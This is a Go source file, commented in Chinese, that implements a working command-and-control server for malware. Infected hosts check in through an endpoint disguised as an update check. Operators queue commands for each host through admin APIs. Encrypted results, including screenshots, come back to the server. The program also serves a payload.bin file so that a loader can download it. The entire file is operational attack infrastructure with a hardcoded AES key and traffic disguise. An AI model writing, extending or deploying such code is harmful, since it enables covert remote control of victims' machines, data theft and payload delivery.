package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sort" // 用于列表排序
	"sync"
	"time"
)

// --- 1. 配置区 ---
// 必须与 Agent 端保持完全一致
var AESKey = []byte("HereIsMySecretKey123456789012345") // 32 bytes

// 内存数据库
var CommandQueue = make(map[string]string) // 待发命令队列 [AgentID]Command
var Agents = make(map[string]*AgentInfo)   // 在线主机列表 [AgentID]Info
var mutex = &sync.Mutex{}                  // 线程安全锁

// --- 2. 数据结构 ---
// 内存中的主机状态
type AgentInfo struct {
	ID         string `json:"id"`
	IP         string `json:"ip"`
	Hostname   string `json:"hostname"`
	LastSeen   int64  `json:"last_seen"`
	Status     string `json:"status"`      // active / offline
	LastResult string `json:"last_result"` // 命令回显或截图数据
}

// 接收 Agent 的请求 (JSON)
type FakeAPIRequest struct {
	Hostname string `json:"hostname"`
	Token    string `json:"token"` // 加密的回显数据
	Status   string `json:"status"`
}

// 发送给 Agent 的响应 (JSON)
type FakeAPIResponse struct {
	Code int    `json:"code"`
	Data string `json:"data"` // 加密的指令
}

// --- 3. 加密套件 (AES-GCM) ---
func Encrypt(text string) (string, error) {
	block, err := aes.NewCipher(AESKey)
	if err != nil {
		return "", err
	}
	plaintext := []byte(text)
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func Decrypt(cryptoText string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(AESKey)
	if err != nil {
		return "", err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonceSize := aesGCM.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

// --- 4. 核心处理逻辑 ---

// [Agent接口] 处理心跳上报
func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	// 读取 Body
	body, _ := io.ReadAll(r.Body)
	var req FakeAPIRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return
	}

	clientIP := r.RemoteAddr
	agentID := req.Hostname // 简单使用 Hostname 作为 ID

	mutex.Lock()
	// 新主机日志
	if _, exists := Agents[agentID]; !exists {
		fmt.Printf("[+] 新主机上线: %s (%s)\n", req.Hostname, clientIP)
	}

	// 维护 LastResult: 如果这次没有新数据，就保留旧的（防止前端闪烁）
	var lastResult = ""
	if old, ok := Agents[agentID]; ok {
		lastResult = old.LastResult
	}
	// 如果有新回显，解密并更新
	if req.Token != "" {
		decrypted, err := Decrypt(req.Token)
		if err == nil && decrypted != "" {
			lastResult = decrypted
			// 如果是截图数据，太长就不打印了，否则打印日志
			if len(decrypted) < 100 {
				fmt.Printf("[Result from %s]: %s\n", agentID, decrypted)
			} else {
				fmt.Printf("[Result from %s]: (收到大数据包/截图: %d bytes)\n", agentID, len(decrypted))
			}
		}
	}

	// 更新内存状态
	currentAgent := &AgentInfo{
		ID:         agentID,
		IP:         clientIP,
		Hostname:   req.Hostname,
		LastSeen:   time.Now().Unix(),
		Status:     "active",
		LastResult: lastResult,
	}
	Agents[agentID] = currentAgent

	// 检查是否有待发指令
	cmdToSend := ""
	if cmd, ok := CommandQueue[agentID]; ok {
		cmdToSend = cmd
		delete(CommandQueue, agentID) // 取出即删
		fmt.Printf("[*] 命令下发给 %s: %s\n", agentID, cmd)
	}
	mutex.Unlock()

	// 构造响应
	resp := FakeAPIResponse{Code: 200}
	if cmdToSend != "" {
		encryptedCmd, _ := Encrypt(cmdToSend)
		resp.Data = encryptedCmd
	}
	json.NewEncoder(w).Encode(resp)
}

// [Admin接口] 获取主机列表 (支持稳定排序)
func apiGetAgents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")

	mutex.Lock()
	defer mutex.Unlock()

	now := time.Now().Unix()
	list := make([]*AgentInfo, 0, len(Agents))

	for _, agent := range Agents {
		// 15秒无心跳判定为离线
		if now-agent.LastSeen > 15 {
			agent.Status = "offline"
		} else {
			agent.Status = "active"
		}
		list = append(list, agent)
	}

	// 稳定排序: 1. Active 在前  2. Hostname 字母序
	sort.Slice(list, func(i, j int) bool {
		if list[i].Status != list[j].Status {
			return list[i].Status == "active"
		}
		return list[i].Hostname < list[j].Hostname
	})

	json.NewEncoder(w).Encode(list)
}

// [Admin接口] 下发命令
func apiSendCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	type CmdReq struct {
		ID  string `json:"id"`
		Cmd string `json:"cmd"`
	}
	var req CmdReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		return
	}

	mutex.Lock()
	CommandQueue[req.ID] = req.Cmd
	mutex.Unlock()

	fmt.Fprintf(w, "ok")
}

// [Admin接口] 删除主机
func apiDeleteAgent(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	id := r.URL.Query().Get("id")

	mutex.Lock()
	delete(Agents, id)
	delete(CommandQueue, id)
	mutex.Unlock()

	fmt.Printf("[-] 主机已移除: %s\n", id)
	fmt.Fprintf(w, "deleted")
}

func main() {
	// 1. Agent 通信接口
	http.HandleFunc("/api/v1/check_update", handleAgentHeartbeat)

	// 2. Web 控制台接口
	http.HandleFunc("/api/admin/agents", apiGetAgents)
	http.HandleFunc("/api/admin/cmd", apiSendCommand)
	http.HandleFunc("/api/admin/delete", apiDeleteAgent)

	// 3. 静态文件服务 (关键修改)
	// 这行代码会把当前目录下的所有文件 (index.html, payload.bin) 都暴露出去
	// 这样 Loader 才能下载到 payload.bin，浏览器才能访问 index.html
	http.Handle("/", http.FileServer(http.Dir(".")))

	fmt.Println("[*] C2 Server (Full Version) 启动: 监听 0.0.0.0:8080")
	// 监听
	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
		fmt.Println("启动失败:", err)
	}
}